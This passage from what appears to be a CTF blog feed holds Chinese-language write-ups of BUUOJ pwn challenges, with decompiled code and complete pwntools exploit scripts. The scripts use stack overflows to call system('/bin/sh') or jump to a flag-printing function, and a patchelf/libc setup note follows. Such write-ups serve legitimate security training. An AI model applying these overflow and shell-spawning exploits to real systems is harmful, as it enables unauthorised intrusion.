class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">136</span>]; <span class="comment">// [esp+0h] [ebp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  system(<span class="string">&quot;echo Input:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显可以栈溢出，左侧找到函数<code>_system</code>，在字符串里面也看到了/bin/sh</p><p>直接加载elf获取system的plt地址，search获取/bin/sh地址，然后溢出调用就行了。</p><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">1</span></span><br><span class="line">file_name = <span class="string">&#x27;./level2&#x27;</span></span><br><span class="line">host = <span class="string">&#x27;node3.buuoj.cn&#x27;</span></span><br><span class="line">port = <span class="number">29921</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"><span class="keyword">if</span> is_debug:</span><br><span class="line">sh = process(file_name)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">sh = remote(host, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">sys_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = <span class="built_in">next</span>(elf.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x8c</span> + p32(sys_plt) + p32(<span class="number">1</span>) + p32(bin_sh_addr)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;\n&#x27;</span>, payload)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;checksec结果：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/sp</summary>
      
    
    
    
    <category term="buuoj" scheme="https://www.ruomo.fun/categories/buuoj/"/>
    
    
    <category term="buuoj" scheme="https://www.ruomo.fun/tags/buuoj/"/>
    
    <category term="pwn" scheme="https://www.ruomo.fun/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>ciscn_2019_n_8</title>
    <link href="https://www.ruomo.fun/2021/06/21/buuoj/ciscn_2019_n_8/"/>
    <id>https://www.ruomo.fun/2021/06/21/buuoj/ciscn_2019_n_8/</id>
    <published>2021-06-21T08:41:46.185Z</published>
    <updated>2021-06-21T09:02:38.578Z</updated>
    
    <content type="html"><![CDATA[<p>checksec结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ checksec --file=ciscn_2019_n_8         </span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE</span><br><span class="line">Partial RELRO   Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   79) Symbols       No    0               1               ciscn_2019_n_8</span><br></pre></td></tr></table></figure><p>保护基本都开了。</p><p>拖入ida，找到<code>main</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp-14h] [ebp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp-10h] [ebp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  var[<span class="number">13</span>] = <span class="number">0</span>;</span><br><span class="line">  var[<span class="number">14</span>] = <span class="number">0</span>;</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s your name?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, var, v4, v5);</span><br><span class="line">  <span class="keyword">if</span> ( *(_QWORD *)&amp;var[<span class="number">13</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_QWORD *)&amp;var[<span class="number">13</span>] == <span class="number">17LL</span> )</span><br><span class="line">      system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">&quot;something wrong! val is %d&quot;</span>,</span><br><span class="line">        var[<span class="number">0</span>],</span><br><span class="line">        var[<span class="number">1</span>],</span><br><span class="line">        var[<span class="number">2</span>],</span><br><span class="line">        var[<span class="number">3</span>],</span><br><span class="line">        var[<span class="number">4</span>],</span><br><span class="line">        var[<span class="number">5</span>],</span><br><span class="line">        var[<span class="number">6</span>],</span><br><span class="line">        var[<span class="number">7</span>],</span><br><span class="line">        var[<span class="number">8</span>],</span><br><span class="line">        var[<span class="number">9</span>],</span><br><span class="line">        var[<span class="number">10</span>],</span><br><span class="line">        var[<span class="number">11</span>],</span><br><span class="line">        var[<span class="number">12</span>],</span><br><span class="line">        var[<span class="number">13</span>],</span><br><span class="line">        var[<span class="number">14</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s, Welcome!\n&quot;</span>, var);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try do something~&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很简单的逻辑，输入名字存到var里面，如果var[13]开始的8个字节不等于0就判断这8个字节是不是等于17。如果等于17就获取shell，如果不等于17就输出当前值。</p><p>双击var可以获取信息<code>.bss:00004060 var             dd 0Fh dup(?)           ; DATA XREF: main+28↑o</code>，说明var的每一个成员都是4字节的。</p><p>payload：padding + 8字节的17</p><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">1</span></span><br><span class="line">file_name = <span class="string">&#x27;./ciscn_2019_n_8&#x27;</span></span><br><span class="line">host = <span class="string">&#x27;node3.buuoj.cn&#x27;</span></span><br><span class="line">port = <span class="number">26220</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"><span class="keyword">if</span> is_debug:</span><br><span class="line">sh = process(file_name)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">sh = remote(host, port)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">52</span> + p64(<span class="number">0x11</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;checksec结果：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/sp</summary>
      
    
    
    
    <category term="buuoj" scheme="https://www.ruomo.fun/categories/buuoj/"/>
    
    
    <category term="buuoj" scheme="https://www.ruomo.fun/tags/buuoj/"/>
    
    <category term="pwn" scheme="https://www.ruomo.fun/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>get_started_3dsctf_2016</title>
    <link href="https://www.ruomo.fun/2021/06/21/buuoj/get_started_3dsctf_2016/"/>
    <id>https://www.ruomo.fun/2021/06/21/buuoj/get_started_3dsctf_2016/</id>
    <published>2021-06-21T08:00:10.361Z</published>
    <updated>2021-06-21T09:02:50.632Z</updated>
    
    <content type="html"><![CDATA[<p>checksec结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ checksec --file=get_started_3dsctf_2016 </span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE</span><br><span class="line">Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   1991) Symbols     No    0               0               get_started_3dsctf_2016</span><br></pre></td></tr></table></figure><p>拖入ida，找到<code>main</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">56</span>]; <span class="comment">// [esp+4h] [ebp-38h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Qual a palavrinha magica? &quot;</span>, v4[<span class="number">0</span>]);</span><br><span class="line">  gets(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显可以栈溢出。</p><p>在main函数上面有一个函数<code>get_flag</code>，看看源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">get_flag</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v3; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v5; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">814536271</span> &amp;&amp; a2 == <span class="number">425138641</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rt&quot;</span>);</span><br><span class="line">    v3 = getc(v2);</span><br><span class="line">    <span class="keyword">if</span> ( v3 != <span class="number">255</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = (<span class="keyword">char</span>)v3;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">putchar</span>(v4);</span><br><span class="line">        v5 = getc(v2);</span><br><span class="line">        v4 = (<span class="keyword">char</span>)v5;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v5 != <span class="number">255</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(v2);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>符合条件就输出flag。</p><p>首先尝试直接跳转到fopen处运行，该处地址为<code>0x80489B8</code>，脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">1</span></span><br><span class="line">file_name = <span class="string">&#x27;./get_started_3dsctf_2016&#x27;</span></span><br><span class="line">host = <span class="string">&#x27;node3.buuoj.cn&#x27;</span></span><br><span class="line">port = <span class="number">25562</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"><span class="keyword">if</span> is_debug:</span><br><span class="line">sh = process(file_name)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">sh = remote(host, port)</span><br><span class="line"></span><br><span class="line">flag_add = <span class="number">0x80489B8</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span> + p32(flag_add)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(sh.recvline())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>执行结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./get_started_3dsctf_2016&#x27;</span>: pid 1401</span><br><span class="line">b<span class="string">&#x27;Qual a palavrinha magica? flag&#123;Th1s_is_A_tEst_f1a9&#125;\n&#x27;</span></span><br><span class="line">[*] Stopped process <span class="string">&#x27;./get_started_3dsctf_2016&#x27;</span> (pid 1401)</span><br></pre></td></tr></table></figure><p>很顺利地输出了同目录测试用的flag.txt。</p><p>改成远程尝试一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+] Opening connection to node3.buuoj.cn on port 27349: Done</span><br><span class="line">b<span class="string">&#x27;timeout: the monitored command dumped core\n&#x27;</span></span><br><span class="line">[*] Closed connection to node3.buuoj.cn port 27349</span><br></pre></td></tr></table></figure><p>timeout了，说明栈没有对齐。那么就是说不能直接跳转到fopen的地方运行获取flag，得换一个法子。那就正常跳转到<code>get_flag</code>，将参数传入试试。</p><p>payload就变成了：padding + get_flag_add + get_flag的返回地址 + a1 + a2</p><p>因为输出flag后我们不需要做什么了，直接返回到exit就行了。</p><p>最终脚本为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">1</span></span><br><span class="line">file_name = <span class="string">&#x27;./get_started_3dsctf_2016&#x27;</span></span><br><span class="line">host = <span class="string">&#x27;node3.buuoj.cn&#x27;</span></span><br><span class="line">port = <span class="number">27349</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"><span class="keyword">if</span> is_debug:</span><br><span class="line">sh = process(file_name)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">sh = remote(host, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">get_flag_add = elf.symbols[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">exit_add = elf.symbols[<span class="string">&#x27;exit&#x27;</span>]</span><br><span class="line">a1 = <span class="number">0x308CD64F</span></span><br><span class="line">a2 = <span class="number">0x195719D1</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span> + p32(get_flag_add) + p32(exit_add) + p32(a1) + p32(a2)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(sh.recvline())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;checksec结果：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/sp</summary>
      
    
    
    
    <category term="buuoj" scheme="https://www.ruomo.fun/categories/buuoj/"/>
    
    
    <category term="buuoj" scheme="https://www.ruomo.fun/tags/buuoj/"/>
    
    <category term="pwn" scheme="https://www.ruomo.fun/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwn使用指定libc运行程序</title>
    <link href="https://www.ruomo.fun/2021/06/21/others/pwn%E4%BD%BF%E7%94%A8%E6%8C%87%E5%AE%9Alibc%E8%BF%90%E8%A1%8C%E7%A8%8B%E5%BA%8F/"/>
    <id>https://www.ruomo.fun/2021/06/21/others/pwn%E4%BD%BF%E7%94%A8%E6%8C%87%E5%AE%9Alibc%E8%BF%90%E8%A1%8C%E7%A8%8B%E5%BA%8F/</id>
    <published>2021-06-21T04:46:11.838Z</published>
    <updated>2021-06-21T07:54:59.138Z</updated>
    
    <content type="html"><![CDATA[<h3 id="patchelf安装">patchelf安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/NixOS/patchelf.git</span><br><span class="line">./bootstrap.sh</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><p>如果出现报错<code>./bootstrap.sh: 2: autoreconf: not found</code>则运行<code>sudo apt-get install autoconf automake libtool</code>后再<code>./bootstrap.sh</code></p><h3 id="glibc-all-in-one安装">glibc-all-in-one安装</h3><p><code>git clone https://github.com/matrix1001/glibc-all-in-one</code></p><h3 id="使用指定libc运行程序">使用指定libc运行程序</h3><ol><li><p>使用glibc-all-in-one下载，或者自己去镜像站下载，如http://ftp.osuosl.org/pub/ubuntu/pool/main/g/glibc/，这里ubuntu的。如果自己下载的deb，那就先用glibc-all-in-one的<code>extract</code>将deb输出</p></li><li><p>调用命令<code>ldd program</code>先看下当前程序的链接情况，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/buuoj/【OGeek2019】babyrop]</span><br><span class="line">└─$ ldd pwn</span><br><span class="line">        linux-gate.so.1 (0xf7f49000)</span><br><span class="line">        libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7d44000)</span><br><span class="line">        /lib/ld-linux.so.2 (0xf7f4b000)</span><br></pre></td></tr></table></figure></li><li><p>用patchelf修改，如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-interpreter ~/Desktop/test/ld-linux.so.2 ./pwn</span><br><span class="line">patchelf --replace-needed libc.so.6 ~/Desktop/test/libc-2.23.so ./pwn</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;patchelf安装&quot;&gt;patchelf安装&lt;/h3&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span c</summary>
      
    
    
    
    <category term="others" scheme="https://www.ruomo.fun/categories/others/"/>
    
    
    <category term="pwn" scheme="https://www.ruomo.fun/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>【OGeek2019】babyrop</title>
    <link href="https://www.ruomo.fun/2021/06/21/buuoj/OGeek2019_babyrop/"/>
    <id>https://www.ruomo.fun/2021/06/21/buuoj/OGeek2019_babyrop/</id>
    <published>2021-06-21T03:30:50.575Z</published>
    <updated>2021-06-21T09:03:14.832Z</updated>
    
    <content type="html"><![CDATA[<p>checksec结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ checksec --file=pwn</span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE</span><br><span class="line">Full RELRO      No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols        No    0               3               pwn</span><br></pre></td></tr></table></figure><p>拖入ida分析，<code>main</code>源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> buf; <span class="comment">// [esp+4h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [esp+Bh] [ebp-Dh]</span></span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  sub_80486BB();</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &gt; <span class="number">0</span> )</span><br><span class="line">    read(fd, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v2 = sub_804871F(buf);</span><br><span class="line">  sub_80487D0(v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到首先会产生一个随机数，存入到buf里面；接着把buf当作参数传入函数<code>sub_804871F</code>中，将函数的返回值存入v2中；最后将v2作为参数传入<code>sub_80487D0</code>函数中。</p><p>看一下<code>sub_804871F</code>的源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">sub_804871F</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">32</span>]; <span class="comment">// [esp+2Ch] [ebp-2Ch] BYREF</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v5; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;%ld&quot;</span>, a1);</span><br><span class="line">  v5 = read(<span class="number">0</span>, buf, <span class="number">0x20</span>u);</span><br><span class="line">  buf[v5 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(buf, s, v1) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Correct\n&quot;</span>, <span class="number">8u</span>);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> __int8)buf[<span class="number">7</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从源码中可以看到会先将传入的参数a1转为字符串存到变量s中，接着用户可以输入内容存入buf中，然后把buf和s比较，如果不相等就结束程序，相等就返回buf变量中的第8个字符。</p><p>这里存在一个漏洞点，函数使用<code>strncmp</code>进行比较，比较的长度v1是用<code>strlen</code>取得buf的长度，因此可以用<code>\x00</code>使得v1的值为0绕过<code>strncmp</code>，也就是说我们可以控制<code>main</code>中的v2的值。</p><p>接下来看一下<code>sub_80487D0</code>的源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __cdecl <span class="title">sub_80487D0</span><span class="params">(<span class="keyword">char</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span 